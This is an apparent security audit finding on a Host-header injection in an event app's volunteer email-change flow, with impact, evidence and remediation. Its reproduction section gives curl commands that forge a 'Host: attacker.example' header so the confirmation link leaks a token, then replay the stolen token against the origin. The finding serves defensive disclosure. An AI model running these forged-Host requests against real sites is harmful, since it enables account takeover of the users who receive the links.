# M-04 — Email-change confirmation link is built from the `Host` header

| | |
| --- | --- |
| **Severity** | Medium |
| **CVSS 3.1** | 5.0 — `AV:N/AC:H/PR:H/UI:R/S:U/C:H/I:N/A:N` |
| **CWE** | CWE-644 (Improper Neutralization of HTTP Headers for Scripting Syntax), CWE-601 (URL Redirection to Untrusted Site) |
| **Component** | Volunteer email-change flow |
| **Affected code** | `server/src/admin.js:346-351`, `server/src/mail.js:102-137` |
| **Status** | Code review (requires an admin session and Host control) |

## Summary

When an organizer/owner changes a volunteer's email, the confirmation URL is built from the request's `Host` header:

```js
confirmUrl: `${req.protocol}://${req.get('host')}/api/admin/volunteers/confirm-email?token=${token}`,
```

The 256-bit token is the only secret needed to apply the change. If an attacker can influence the `Host` header on that request (direct-to-origin access, a proxy that forwards the client Host, or a poisoned cache), the email sent to the volunteer contains a link to `https://attacker.example/...`. When the volunteer clicks it, the token is sent to the attacker, who can then call the real endpoint and apply the change.

This is a Host-header injection / password-reset-poisoning class bug. It is not exploitable through the normal localtunnel host, but it is a latent issue for any deployment where the app is reachable by IP, multiple hostnames, or a permissive proxy.

A related design weakness: the change is applied with **no notification to the old address**, so the legitimate volunteer has no way to detect or reject the change. An organizer can move a volunteer's login email to an address they control (the token goes there), locking the volunteer out of the account.

## Impact

- Theft of a valid email-change token → attacker controls the account's login email.
- Phishing: the volunteer receives a genuine-looking email from the app pointing at an attacker domain.
- Silent account takeover/DoS: the old email is never notified; the volunteer discovers the change only when login fails.

## Preconditions

- An admin/organizer session to trigger `PATCH /api/admin/volunteers/:id`.
- Ability to influence the `Host` header of that request (direct origin access, proxy that does not normalise Host, or cache poisoning).
- The volunteer clicks the link within 24 hours.

## Reproduction

```bash
BASE=http://localhost:4000
ORG_JAR=org.jar          # organizer session cookie
VOL_ID=<volunteer-uuid>  # from GET /api/admin/volunteers
EVENT_ID=2

# Change the volunteer's email while supplying an attacker-controlled Host.
curl -sS -b "$ORG_JAR" -X PATCH "$BASE/api/admin/volunteers/$VOL_ID" \
  -H 'Host: attacker.example' \
  -H 'content-type: application/json' \
  -d "{\"name\":\"Volunteer Name\",\"email\":\"new-address@example.com\",\"eventId\":$EVENT_ID}"
```

The verification email sent to `new-address@example.com` contains:

```text
http://attacker.example/api/admin/volunteers/confirm-email?token=<256-bit-token>
```

If the recipient clicks it, `attacker.example` receives the token. The attacker then applies it against the real origin:

```bash
curl -sS "https://real-origin.example/api/admin/volunteers/confirm-email?token=<stolen-token>"
# 200 "Email updated"
```

Note: `req.protocol` is `http` unless `trust proxy` is correct, so the link may be `http://` even when the site is HTTPS — another reason to use a configured origin.

## Evidence

`server/src/admin.js:346-351`:

```js
try {
  const mail = await sendEmailChangeEmail({
    to: email,
    name,
    confirmUrl: `${req.protocol}://${req.get('host')}/api/admin/volunteers/confirm-email?token=${token}`,
  });
  emailSent = true;
  emailPreviewUrl = mail.previewUrl;
} catch (err) {
  // ...
}
```

`server/src/mail.js:102-137` embeds `confirmUrl` in both the HTML (`href`) and the plain-text body.

## Root cause

Security-sensitive absolute URLs are derived from request headers instead of a trusted configuration value. The application has no `APP_ORIGIN`/`PUBLIC_URL` setting, so it must guess its own origin.

## Remediation

1. Add a required `APP_ORIGIN` (e.g. `https://events.example.com`) and build links from it:

   ```js
   const origin = process.env.APP_ORIGIN;
   if (!origin || !/^https?:\/\/[^/]+$/.test(origin)) throw new Error('Set APP_ORIGIN');
   const confirmUrl = `${origin}/api/admin/volunteers/confirm-email?token=${token}`;
   ```

   Validate it at startup and fail closed if missing in production.
2. If multiple origins are needed, use an allowlist and reject anything else.
3. Validate `req.hostname` against the allowlist as defense-in-depth; do not trust `X-Forwarded-Host` unless the proxy overwrites it.
4. Notify the **old** email address when a change is requested and when it is applied, with a "this wasn't me" link that revokes the pending token.
5. Consider requiring the volunteer to be signed in to confirm, instead of a bearer link.
6. Rate-limit and single-use the token (single-use is already implemented).

## Verification

- Set `APP_ORIGIN`, trigger an email change with a forged `Host: attacker.example`, and confirm the link still points at `APP_ORIGIN`.
- Confirm the old address receives a notification.
- Confirm a missing `APP_ORIGIN` in production aborts startup.

## References

- OWASP Password Reset Poisoning / Host Header Injection
- OWASP ASVS 5.0 V3.4 — secure credential recovery
- CWE-644, CWE-601
